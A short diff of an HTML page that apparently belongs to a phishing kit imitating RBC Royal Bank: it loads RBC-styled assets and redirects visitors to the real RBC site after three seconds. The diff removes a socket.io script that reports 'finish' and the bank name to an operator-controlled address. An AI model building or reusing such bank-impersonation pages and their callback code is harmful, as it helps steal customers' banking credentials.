@@ -7,12 +7,6 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <link rel="stylesheet" href="/assets/rbc/new/main.css">
         <meta http-equiv="refresh" content="3;URL=https://www.rbcroyalbank.com/personal.html">
-        <script src="/socket.io/socket.io.js"></script>
-        <script>
-            const socket = io.connect('<%= ip %>');
-            socket.emit('updatePage', 'finish');
-            socket.emit('updateBanks', 'rbc');
-        </script>
     </head>
     <body>
         <app-root ng-version="10.2.5">
